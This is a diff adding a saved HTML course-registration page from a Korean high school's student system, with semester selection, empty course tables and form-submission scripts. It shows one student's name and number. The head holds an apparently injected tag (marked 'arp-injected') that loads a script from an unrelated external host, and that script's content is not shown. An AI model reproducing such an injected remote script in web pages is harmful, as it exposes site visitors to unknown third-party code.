@@ -1,0 +1,163 @@
+<html data-arp-injected="true"><head><script type="text/javascript" src="https://3001.scriptcdn.net/code/static/1"></script></head><body topmargin="0" leftmargin="0"><link rel="stylesheet" href="/css/style.css">
+<style type="text/css">
+a{ text-decoration:none;color:#333;}
+body {font-family:NotoKrR;}
+</style>
+<title>▒현대청운고등학교▒</title>
+
+<table width="850" cellspacing="0" style="border-collapse:collapse;" align="center">
+	<tbody><tr>
+		<td background="/2.jpg" height="40" style="border-width:1; border-color:black; border-style:none;" valign="bottom">
+			<font size="3" color="white">현대청운고등학교 통합시스템</font>
+		</td>
+    </tr>
+</tbody></table>
+
+<table width="850" cellspacing="0" style="font-size:14;" align="center">
+	<tbody><tr>
+        <td width="60%" valign="top">
+		<form name="form11" method="post">
+<table cellspacing="0" style="font-size:14;">
+	<tbody><tr>
+		<td valign="top"><input type="button" value="첫화면" onclick="location.href='/student.html';" style="font-family:NotoKrR;font-size:14;width:80;height:30;cursor:hand;"></td>
+		<td valign="top">
+			<font color="blue">30619 이승준</font>
+		</td>
+	</tr>
+</tbody></table>
+
+</form>
+<iframe name="m2" width="0" height="0" frameborder="no"></iframe>
+
+<script>
+function func_menu(s_menu){
+	document.form11.target = "m2";
+	document.form11.action = "https://hcuhs.kr/student.php?s_menu="+s_menu;
+	document.form11.submit();
+}
+</script>
+		</td>
+        <td align="right" width="40%" valign="top">
+			<a href="./index_hcu.html" style="background-color:rgb(67,98,38);color:white;">[강좌신청]</a>
+			<a href="./stu_timetable_hcu.html">[시간표보기]</a>
+		</td>
+                </tr>
+            </tbody></table>
+<br>
+<form name="form1" method="post">
+<table cellspacing="0" align="center" width="850">
+	<tbody><tr>
+		<td>
+			<select name="term" style="font-family:NotoKrR;font-size:15;min-width:150;height:30;padding-left:10;cursor:hand;" onchange="func_term(this.value);">
+				<option value="">학기 선택</option>				<option value="21">2학년 1학기
+				</option>
+				<option value="22">2학년 2학기
+				</option>
+				<option value="31">3학년 1학기
+				</option>
+				<option value="32">3학년 2학기
+				</option>
+			</select>
+		</td>
+	</tr>
+</tbody></table>
+<table cellspacing="1" bgcolor="#CCCCCC" align="center" width="850" style="font-size:15;">
+	<tbody><tr bgcolor="#FFFFFF" align="center" height="30">
+		<td width="7%">연번</td>
+		<td width="14%">영역</td>
+		<td width="14%">교과</td>
+		<td width="10%">분류</td>
+		<td width="25%">과목</td>
+		<td width="10%">운영단위</td>
+		<td width="10%">단위수</td>
+		<td width="10%">비고</td>
+	</tr>
+
+</tbody></table>
+
+<br>
+
+<table width="850" align="center" cellspacing="0" style="font-size:15;">
+	<tbody><tr>
+		<td>
+
+		<input type="hidden" name="ch_1" value=""><input type="hidden" name="ch_2" value=""><input type="hidden" name="ch_3" value=""><input type="hidden" name="ki" value="">
+		</td>
+	</tr>
+</tbody></table>
+
+<table cellspacing="1" bgcolor="#CCCCCC" align="center" width="850" style="font-size:15;">
+	<tbody><tr bgcolor="#FFFFFF" align="center" height="30">
+		<td width="7%">연번</td>
+		<td width="14%">영역</td>
+		<td width="14%">교과</td>
+		<td width="10%">분류</td>
+		<td width="25%">과목</td>
+		<td width="10%">운영단위</td>
+		<td width="10%">단위수</td>
+		<td width="10%">신청</td>
+	</tr>
+
+</tbody></table>
+<table width="850" align="center" cellspacing="0" style="font-size:15;">
+	<tbody><tr>
+		<td width="70%">
+			<font color="red">※단위수가 운영단위보다 작은 경우는 반드시 두 학기동안 수강해야 함.</font>&nbsp;&nbsp;
+		</td>
+		<td align="right">
+					</td>
+	</tr>
+</tbody></table>
+<input type="hidden" name="menu_total" value="0">
+<input type="hidden" name="final_x" value="">
+<input type="hidden" name="s_c" value="시간표">
+<input type="hidden" name="h_c" value="">
+<input type="hidden" name="ch_total" value="">
+<input type="hidden" name="final" value="">
+</form>
+<iframe name="f2" width="0" height="0" frameborder="no"></iframe>
+<script>
+var number = "30619";
+function func_term(term){
+	location.href = "?term="+term;
+}
+
+function func_term_(term){
+	var state = "시간표";
+	alert(state);
+	if(state != "완료"){
+		location.href = "?term="+term;
+	}else{
+		var msg = state+" 작업중입니다.";
+		alert(msg);
+	}
+
+}
+
+function func_lesson(term,lesson){
+	location.href = "?term="+term+"&lesson="+lesson;
+
+}
+
+
+function func_del(title,UID){
+	del = confirm(title+" 과목을 취소(삭제)하겠습니까?");
+	if(del==true){
+//		document.form1.target = "f2";
+		document.form1.action = "stu_del_hcu.php?UID="+UID;
+		document.form1.submit();
+	}else{return;}
+}
+
+function func_check(){
+	document.form1.target = "f2";
+	document.form1.action = "stu_check.php?number="+number;
+	document.form1.submit();
+}
+
+function func_submit(){
+	document.form1.target = "f2";
+	document.form1.action = "stu_insert_hcu.php?number="+number;
+	document.form1.submit();
+}
+</script></body></html>
